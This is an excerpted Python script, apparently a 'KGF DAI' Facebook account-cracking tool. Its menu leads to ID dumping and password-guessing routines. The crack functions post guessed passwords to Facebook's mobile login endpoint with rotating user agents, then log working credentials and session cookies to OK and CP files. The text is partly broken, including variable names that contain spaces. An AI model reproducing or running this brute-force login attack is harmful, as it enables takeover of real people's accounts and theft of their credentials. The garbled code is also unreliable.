...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/KGF DAI.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: HERO')
    password = input(' \033[0;93mEnter Password:DAI ')
...
print("\033[1;92m  KK  GGGGGG FF   DDDDDD AAAAAAA   IIIIII
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mSM-KGF DAI ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • KGF DAI  ]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mKGF DAI-BRAND ]  ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  KGF DAI,   Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    KGF DAI = input('\x1b[1;92m[+] CHOOSE: ')
    if KGF DAI in ['111']:
        login()
        dump_massal()
    elif KGF DAI in ['1']:
        crack_file()
    elif KGF DAI in ['2','02']:
        os.system('xdg-open https://www.facebook.com/KGF DAI.khadka.587')
        os.system("python nono.py")
    elif KGF DAI in ['3','03']:
        result()
    elif KGF DAI in ['0']:
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY KGF DAI VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[KGF DAIM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[KGF DAI-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " KGF DAI,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[KGF DAI-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•KGF DAI-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•KGF DAI-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  KGF DAI,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
